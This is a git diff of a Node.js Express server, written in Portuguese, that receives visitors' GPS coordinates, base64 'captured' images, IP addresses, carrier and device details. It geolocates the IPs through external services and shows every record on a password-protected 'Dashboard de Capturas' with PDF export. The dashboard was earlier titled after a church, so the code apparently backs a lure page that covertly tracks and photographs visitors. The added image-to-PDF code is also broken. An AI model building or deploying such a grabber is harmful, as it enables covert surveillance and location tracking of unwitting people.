@@ -18,6 +18,7 @@ const fs = require('fs');
 const path = require('path');
 const https = require('https');
 const app = express();
+
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.json({ limit: '10mb' }));
 app.set('trust proxy', true);
@@ -41,7 +42,6 @@ async function obterIPPublicoReal(req) {
       trueClientIP: req.headers['true-client-ip'],
       forwarded: req.headers['forwarded']
     };
-
     let clientIP = null;
     if (ips.xForwardedFor) {
       clientIP = ips.xForwardedFor.split(',')[0].trim();
@@ -56,35 +56,29 @@ async function obterIPPublicoReal(req) {
     } else {
       clientIP = ips.remoteAddress || ips.socketAddress || ips.connectionSocket || ips.reqIP;
     }
-
     if (clientIP && clientIP.startsWith('::ffff:')) {
       clientIP = clientIP.substring(7);
     }
-
     let ipPublicoReal = clientIP;
     let ipPublicoIPv4Real = null; // Vamos buscar um IPv4 público real
     let dadosGeoIP = {};
-
     const isPrivateIP = clientIP && (
-      clientIP.startsWith('192.168.') || 
-      clientIP.startsWith('10.') || 
-      clientIP.startsWith('172.') || 
-      clientIP === '127.0.0.1' || 
+      clientIP.startsWith('192.168.') ||
+      clientIP.startsWith('10.') ||
+      clientIP.startsWith('172.') ||
+      clientIP === '127.0.0.1' ||
       clientIP === '::1' ||
       clientIP === 'localhost' ||
       clientIP.startsWith('169.254.')
     );
-
-    // Lista de serviços que retornam apenas IPv4 (os mais confiáveis)
     const servicosIPv4 = [
-      'https://api.ipify.org?format=json',           // Muito confiável
-      'https://checkip.amazonaws.com',               // Retorna só IPv4
-      'https://ifconfig.me/ip',                      // Simples e direto
-      'https://icanhazip.com',                       // IPv4 por padrão
-      'https://ident.me',                            // Retorna IPv4
+      'https://api.ipify.org?format=json',
+      'https://checkip.amazonaws.com',
+      'https://ifconfig.me/ip',
+      'https://icanhazip.com',
+      'https://ident.me',
       'https://myexternalip.com/raw'
     ];
-
     if (isPrivateIP || !clientIP.includes('.')) {
       for (const servico of servicosIPv4) {
         try {
@@ -97,10 +91,9 @@ async function obterIPPublicoReal(req) {
           } else if (typeof response.data === 'string') {
             ip = response.data.trim();
           }
-          // Verifica se é IPv4 válido
           if (ip && ip.match(/^(?!0)(?!.*\.$)((1?\d?\d|2[0-4]\d|25[0-5])\.){3}(?!0\d)\d+$/)) {
             ipPublicoIPv4Real = ip;
-            ipPublicoReal = ip; // Usa o IPv4 como principal se não tiver
+            ipPublicoReal = ip;
             break;
           }
         } catch (err) {
@@ -108,19 +101,14 @@ async function obterIPPublicoReal(req) {
         }
       }
     } else if (clientIP.includes('.')) {
-      // Se já for um IPv4, validamos e usamos
       if (clientIP.match(/^(?!0)(?!.*\.$)((1?\d?\d|2[0-4]\d|25[0-5])\.){3}(?!0\d)\d+$/)) {
         ipPublicoIPv4Real = clientIP;
       }
     }
-
-    // Se não conseguiu IPv4, marcar como não disponível
     if (!ipPublicoIPv4Real) {
       ipPublicoIPv4Real = 'Não disponível';
     }
-
     const ipParaGeo = ipPublicoIPv4Real !== 'Não disponível' ? ipPublicoIPv4Real : ipPublicoReal;
-
     const geoServicos = [
       `http://ip-api.com/json/${ipParaGeo}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`,
       `https://ipapi.co/${ipParaGeo}/json/`,
@@ -150,12 +138,11 @@ async function obterIPPublicoReal(req) {
         console.log(`❌ Falha no serviço Geo: ${servicoGeo}`, err.message);
       }
     }
-
     return {
       ipOriginal: clientIP,
       ipPublico: ipPublicoReal,
       ipPublicoOperadora: ipPublicoReal,
-      ipPublicoIPv4Real, // Novo campo: IPv4 real visível no "meu ip"
+      ipPublicoIPv4Real,
       ipv4: (clientIP && clientIP.includes('.')) ? clientIP : 'Não detectado',
       ipv6: (clientIP && clientIP.includes(':') && !clientIP.startsWith('::ffff:')) ? clientIP : 'Não detectado',
       todosIPs: ips,
@@ -236,15 +223,11 @@ app.post('/dados', async (req, res) => {
     const caminhoImagem = path.join(pastaCapturas, fileName);
     fs.writeFileSync(caminhoImagem, base64Data, 'base64');
   }
-
   const dadosIP = await obterIPPublicoReal(req);
-
-  // Obter CEP do GPS automaticamente se coordenadas forem fornecidas
   let cepGPS = 'Não informado';
   if (latitude && longitude) {
     cepGPS = await obterCepPorCoordenadas(latitude, longitude);
   }
-
   const registro = {
     latitude,
     longitude,
@@ -256,7 +239,7 @@ app.post('/dados', async (req, res) => {
     ipOriginal: dadosIP.ipOriginal,
     ipPublico: dadosIP.ipPublico,
     ipPublicoOperadora: dadosIP.ipPublicoOperadora,
-    ipPublicoIPv4Real: dadosIP.ipPublicoIPv4Real, // Novo campo adicionado
+    ipPublicoIPv4Real: dadosIP.ipPublicoIPv4Real,
     ipv4: dadosIP.ipv4,
     ipv6: dadosIP.ipv6,
     ehIPPrivado: dadosIP.ehIPPrivado,
@@ -274,7 +257,6 @@ app.post('/dados', async (req, res) => {
     todosIPs: dadosIP.todosIPs,
     cepGPS
   };
-
   dadosRecebidos.push(registro);
   res.send('Dados recebidos com sucesso!');
 });
@@ -324,7 +306,7 @@ app.get('/dashboard', autenticar, (req, res) => {
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8" />
-  <title>Dashboard - Igreja Esperança Viva</title>
+  <title>Dashboard - DF_STRUCTS</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Segoe+UI&display=swap');
     body {
@@ -469,20 +451,50 @@ app.get('/dashboard', autenticar, (req, res) => {
       background-color: #4ac789;
       box-shadow: 0 0 7px #49d17eaa;
     }
+
+    /* Logo DF_STRUCTS no canto superior direito */
+    .logo-dfstructs {
+      position: absolute;
+      top: 10px;
+      right: 20px;
+      width: 120px;
+      height: 120px;
+      object-fit: contain;
+      z-index: 10;
+    }
+
+    /* Estilização do "Último Acesso" com gradiente */
+    .ultimo-acesso {
+      font-size: 1.4rem;
+      font-weight: 700;
+      background: linear-gradient(90deg, #7D60FF, #0F9B58);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      color: transparent;
+    }
   </style>
 </head>
 <body>
+  <!-- Logo no canto superior direito -->
+  <div class="logo-dfstructs">
+    <img src="/dfstructs-logo.png" alt="Logo DF_STRUCTS" />
+  </div>
+
   <h1>📊 Dashboard de Capturas - IP Público Real</h1>
+
   <div class="area-botoes">
     <button class="botao" id="btn-exportar">📄 Exportar para PDF</button>
     <button class="botao botao-atualizar" id="btn-atualizar">🔄 Atualizar</button>
   </div>
+
   <div class="stats" id="stats"></div>
   <div id="dashboard-container"></div>
 
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
   <script>
     let dadosGlobais = [];
+
     async function atualizarDashboard() {
       try {
         const res = await fetch('/dados-json');
@@ -511,9 +523,9 @@ app.get('/dashboard', autenticar, (req, res) => {
             <div class="stat-number">\${ipsUnicos}</div>
             <div>IPs IPv4 Únicos</div>
           </div>
-          <div class="stat-card" style="color: #8888bb; font-size: 0.85rem;">
-            <div>Último Acesso</div>
-            <div>\${ultimo}</div>
+          <div class="stat-card">
+            <div class="ultimo-acesso">Último Acesso</div>
+            <div class="ultimo-acesso">\${ultimo}</div>
           </div>
         \`;
 
@@ -585,22 +597,28 @@ app.get('/dashboard', autenticar, (req, res) => {
       try {
         const { jsPDF } = window.jspdf;
         const doc = new jsPDF({ unit: 'pt' });
+
         doc.setFontSize(20);
         doc.setTextColor('#7c6cff');
-        doc.text('Dashboard - Igreja Esperança Viva', 40, 40);
+        doc.text('Dashboard - DF_STRUCTS', 40, 40);
+
         doc.setFontSize(14);
         doc.setTextColor('#555555');
         doc.text('Relatório de IPs Públicos e Capturas', 40, 65);
+
         let y = 100;
+
         dadosGlobais.forEach((dado, index) => {
           if (y > 730) {
             doc.addPage();
             y = 50;
           }
+
           doc.setFontSize(16);
           doc.setTextColor('#7c6cff');
           doc.text(\`\${dado.origem === 'index.html' ? 'Acesso' : 'Captura'} \${index + 1}\`, 40, y);
           y += 22;
+
           doc.setFontSize(11);
           doc.setTextColor('#333333');
           doc.text(\`Horário: \${dado.horario || '-'}\`, 50, y); y += 15;
@@ -613,9 +631,31 @@ app.get('/dashboard', autenticar, (req, res) => {
           doc.text(\`CEP (GPS): \${dado.cepGPS || '-'}\`, 50, y); y += 15;
           doc.text(\`Operadora: \${dado.operadora || '-'}\`, 50, y); y += 15;
           doc.text(\`Organização: \${dado.organizacao || '-'}\`, 50, y); y += 15;
+
           const sistemaTexto = dado.sistema ? (dado.sistema.length > 80 ? dado.sistema.substring(0, 80) + '...' : dado.sistema) : '-';
           doc.text(\`Sistema: \${sistemaTexto}\`, 50, y); y += 25;
+
+          // Adicionar imagem capturada
+          if (dado.imagem) {
+            const imagePath = '/capturas/' + dado.imagem;
+            const imgData = new Image();
+            imgData.src = imagePath;
+
+            // Aguardar a imagem ser carregada antes de adicionar ao PDF
+            imgData.onload = () => {
+              const imgWidth = 150; // Largura da imagem no PDF
+              const imgHeight = (imgData.height * imgWidth) / imgData.width; // Manter proporção
+              doc.addImage(imgData, 'PNG', 50, y, imgWidth, imgHeight);
+              y += imgHeight + 15; // Avançar Y após adicionar a imagem
+            };
+
+            // Certificar-se de que a imagem foi carregada
+            if (!imgData.complete) {
+              return;
+            }
+          }
         });
+
         doc.save(\`dashboard-ips-publicos-\${Date.now()}.pdf\`);
         console.log('📄 PDF exportado com sucesso!');
       } catch (ex) {
